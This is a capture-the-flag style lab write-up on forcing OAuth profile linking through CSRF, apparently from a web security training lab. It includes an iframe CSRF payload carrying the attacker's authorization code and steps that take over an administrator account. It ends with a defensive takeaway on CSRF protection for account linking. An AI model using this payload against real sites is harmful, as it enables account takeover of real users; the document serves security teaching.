# Lab: Forced OAuth Profile Linking

## Objective

Exploit an insecure OAuth account-linking implementation using CSRF to attach the attacker's social media account to the administrator's blog account.

---

## Steps

### 1. Log in

Logged in to the blog using:

```
Username: wiener
Password: peter
```

---

### 2. Start the OAuth Linking Flow

Intercepted the request initiating OAuth account linking.

```http
GET /auth?client_id=...&redirect_uri=.../oauth-linking
```

---

### 3. Complete OAuth Authentication

Logged into the social media account:

```
Username: peter.wiener
Password: hotdog
```

Intercepted the callback request.

```http
GET /oauth-linking?code=i9rY6I5Hz3mFUOKerdcEJGLqJKhtu6I7kIHpwV84ovj
```

Copied the authorization code.

---

### 4. Build the CSRF Payload

Created the following HTML:

```html
<iframe src="https://TARGET/oauth-linking?code=i9rY6I5Hz3mFUOKerdcEJGLqJKhtu6I7kIHpwV84ovj"></iframe>
```

---

### 5. Deliver the Exploit

Hosted the payload on the exploit server.

When the administrator visited the page, the browser automatically requested:

```http
GET /oauth-linking?code=...
```

while authenticated as the administrator.

---

### 6. Result

The administrator's account became linked to my social media profile.

After logging out and signing in using my social media credentials:

```
Username: peter.wiener
Password: hotdog
```

I was authenticated as the administrator.

Opened:

```
/admin
```

Deleted:

```
carlos
```

Successfully solved the lab.

---

## Vulnerability

The OAuth account-linking endpoint was vulnerable to Cross-Site Request Forgery (CSRF).

The server trusted the authorization code without verifying that it belonged to the same authenticated user who initiated the linking process.

---

## Impact

An attacker can force another user to link the attacker's OAuth identity to the victim's account.

This allows complete account takeover whenever OAuth login is used.

---

## Key Takeaway

OAuth account-linking operations must always require CSRF protection and validate that the OAuth authorization flow belongs to the current authenticated session.

---

## Skills Learned

- OAuth Account Linking
- OAuth Authorization Code Flow
- CSRF
- Account Takeover
- Burp Repeater
